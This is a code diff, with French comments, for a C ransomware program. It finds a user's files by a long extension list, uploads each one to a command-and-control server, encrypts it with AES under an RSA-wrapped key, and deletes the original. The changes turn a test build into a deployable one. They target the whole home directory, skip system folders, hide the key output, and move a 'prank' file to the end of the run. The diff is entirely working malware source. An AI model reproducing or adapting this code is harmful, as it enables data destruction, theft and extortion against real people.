@@ -9,16 +9,14 @@
 #include <fcntl.h>
 #include <openssl/evp.h>
 #include <openssl/aes.h>
-
-
 #include <openssl/rand.h>
-
 #include <openssl/err.h>
 
 #ifdef _WIN32
 #include <windows.h>
 #include <shlobj.h>
 #include <wchar.h>
+#include <lmcons.h>
 #else
 #include <unistd.h>
 #endif
@@ -34,13 +32,13 @@ char generate_random_char();
 
 
 // Liste des extensions à chiffrer
-const char *extensions[] = {".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", 
-                            ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", 
+const char *extensions[] = {".sql", ".mp4", ".7z", ".rar", ".m4a", ".wma", ".avi", ".wmv", ".c", ".h", 
+                            ".csv", ".d3dbsp", ".zip", ".sie", ".sum", ".ibank", ".t13", ".t12", ".md",
                             ".qdf", ".gdb", ".tax", ".pkpass", ".bc6", ".bc7", ".bkp", ".qic", ".bkf", 
                             ".sidn", ".sidd", ".mddata", ".itl", ".itdb", ".icxs", ".hvpl", ".hplg", 
                             ".hkdb", ".mdbackup", ".syncdb", ".gho", ".cas", ".svg", ".map", ".wmo", 
                             ".itm", ".sb", ".fos", ".mov", ".vdf", ".ztmp", ".sis", ".sid", ".ncf", 
-                            ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip", 
+                            ".menu", ".layout", ".dmp", ".blob", ".esm", ".vcf", ".vtf", ".dazip",
                             ".fpk", ".mlx", ".kf", ".iwd", ".vpk", ".tor", ".psk", ".rim", ".w3x", 
                             ".fsh", ".ntl", ".arch00", ".lvl", ".snx", ".cfr", ".ff", ".vpp_pc", ".lrf", 
                             ".m2", ".mcmeta", ".vfs0", ".mpqge", ".kdb", ".db0", ".dba", ".rofl", ".hkx", 
@@ -59,7 +57,7 @@ const size_t num_extensions = sizeof(extensions) / sizeof(extensions[0]);
 
 int main() {
 
-    create_prank_file();
+
     OpenSSL_add_all_algorithms();
     ERR_load_crypto_strings();
 
@@ -74,7 +72,6 @@ int main() {
     const char* public_key_pem = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl+Ddet9QlwRgiq0m5bks\nK1pECg8k/lPvHjFbdsz2IPWA2annk/aYmN8DZR4+fz1NSy6mcxHoCJPh9mK4ngJ8\nezml7P5008MsDSohPQdaCDlZu3YV7mQGrtx1cZgxN8FjGszAAhU0BovdKM6OHmKb\nvPH08tV/SZuu0skcDDVTHZwrm4GYuFIi6dBLyIKuzYytXNt2Y7YT9r9NINVdpIf5\nnzY+6KobIjX/B3z4IvF8DHyESf8/u+SNAfe+kTK/INO8/TqUY1Y568QH6dbPro7z\nAABa6tj62d7mVD68vaQI6nh5Vh7TN0Ps6SnjBDV+NbTKq1jA5dEH+I9EMJx69n0m\nxyYpt5q5mRdn0ya7VqNkUT7jTZQ2gyPy0Yf8u8jBZ6lpaEvnqltlmsGpx3SAjKkl\nrrnDXqq+VopCIEFBVps1opjZtk5jafp5TP/JCzNFzW3ajaAZdWFbppHCWeegE4d7\nVOJqh+w3jpxAzbAUYu5Sykc2sWZZep82FhBSlqeDBJ1PmOsi5oiMSgAnUNGzaBOn\n1ZWjvXRTAC9zd/EyOzKoQ4eQh7UJYsIdzbDMdgq15Cesgp18+ohvcdtnmAHQ//mH\nKU1TOQ8qlPjvIeYAdXQT+qwXNPTadxszucJs3c+7BLxJMXD/bMh4Sq6PYza3Rg27\nF07u/gwEJGvCzV87VvqAj90CAwEAAQ==\n-----END PUBLIC KEY-----\n";
 
     load_public_key(public_key_pem, &pub_key);
-    // load_private_key("private_key.pem", &priv_key);
 
     // Generate AES key and IV
     unsigned char key[32];
@@ -88,14 +85,14 @@ int main() {
     key_lisible = debug_bytes(key, key_size);
     iv_lisible = debug_bytes(iv, iv_size);
     
-    printf("\nAES non chiffré: %s",key_lisible);
-    printf("\nIV non chiffré: %s",iv_lisible);
+    // printf("\nAES non chiffré: %s",key_lisible);
+    // printf("\nIV non chiffré: %s",iv_lisible);
 
     char *encrypted_key = rsa_encrypt(key_lisible, &pub_key);
-    printf("\n\nAES chiffré : %s\n", encrypted_key);
+    // printf("\n\nAES chiffré : %s\n", encrypted_key);
     
     char *encrypted_iv = rsa_encrypt(iv_lisible, &pub_key);
-    printf("\n\nIV chiffré : %s\n", encrypted_iv);
+    // printf("\n\nIV chiffré : %s\n", encrypted_iv);
 
     write_to_file("aes_key.txt", encrypted_key, 1024);
     write_to_file("iv.txt", encrypted_iv, 1024);
@@ -118,7 +115,9 @@ int main() {
     free(encrypted_iv); 
 
     free_public_key(&pub_key);
-
+  
+    create_prank_file();
+  
     return 0;
 
 }
@@ -210,58 +209,78 @@ char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size){
     for (size_t i = 0; i < sequence_size; ++i) {
         j += sprintf(&lisible[j], "%02x", byte_sequence[i]);
     }
-    // printf("KEY / IV : %s\n", lisible); // Affiche la représentation hexadécimale
     return lisible;
 }
 
 void write_to_file(char *filename, char *value, int size){
     FILE *file_pointer;
-    file_pointer = fopen(filename, "w"); // Ouvre le fichier en mode écriture
+    file_pointer = fopen(filename, "w");
 
     if (file_pointer == NULL) {
         printf("Error: cannot open the file.\n");
     }
 
-    fwrite(value, sizeof(char), size, file_pointer); // Écrit la clé dans le fichier
+    fwrite(value, sizeof(char), size, file_pointer); 
 
-    fclose(file_pointer); // Ferme le fichier
+    fclose(file_pointer);
 }
 
 void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL){
     // List all the files we want to encrypt
     const char *path;
+    const char *user;
 
     #ifdef _WIN32
-    path = "C:\\Users\\me\\Documents";
+    user = getenv("USERNAME");
+    size_t size = snprintf(NULL, 0, "C:\\Users\\%s", user) + 1;
+    path = (char *)malloc(size);
+    snprintf(path, size, "C:\\Users\\%s", user);
+
     #else
-    path = "/home/lorette/test1";
+    user = getenv("USER");
+    size_t size = snprintf(NULL, 0, "/home/%s", user) + 1;
+    path = (char *)malloc(size);
+    snprintf(path, size, "/home/%s", user);
+    printf("%s", path);
     #endif
 
     PathList pathList;
     initPathList(&pathList);
-
     listFiles(path, &pathList);
 
-    //Browse files
-    for (size_t i = 0; i < pathList.count; ++i) {
+    const char *ignoreDirs[] = {
+          "Windows\\",
+          "Program Files\\",
+          "Programmes\\",
+          "Programmes (x86)\\",
+          "Program Files (x86)\\",
+          "ProgramData\\",
+          "$Recycle.Bin\\",
+          "Corbeille\\",
+          "AppData\\",
+      };
+      size_t num_ignoreDirs = sizeof(ignoreDirs) / sizeof(ignoreDirs[0]);
 
-        if (strstr(pathList.paths[i], "basic_c/") != NULL) {
-            continue; // Ignorer le dossier "basic_c" et ses fichiers
+    for (size_t i = 0; i < pathList.count; ++i) {
+        int should_ignore = 0;
+        for (size_t j = 0; j < num_ignoreDirs; ++j) {
+            if (strstr(pathList.paths[i], ignoreDirs[j]) != NULL) {
+                should_ignore = 1;
+                break;
+            }
         }
-        
-        // Check if the file has one of the specified extensions
+        if (should_ignore) {
+            continue;
+        }
+
         char *extension = strrchr(pathList.paths[i], '.');
         if (extension != NULL) {
             for (size_t j = 0; j < num_extensions; ++j) {
                 if (strcmp(extension, extensions[j]) == 0) {
-                    // Send the files to the C2 before being encrypted
                     sendFileToApi(pathList.paths[i], id, URL);
-                    // Encrypt the file
                     encrypt_file(key, iv, aad, pathList.paths[i]);
-                    // Decrypt the file (for demonstration purposes)
-                    sleep(1);
+                    remove(pathList.paths[i]);
                     #ifdef _WIN32
-                    // Supprimer le fichier d'origine après chiffrement sur Windows
                     if (remove(pathList.paths[i]) == 0) {
                         printf("File deleted successfully: %s\n", pathList.paths[i]);
                     } else {
@@ -273,7 +292,6 @@ void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, con
             }
         }
     }
-
     freePathList(&pathList);
 }
 
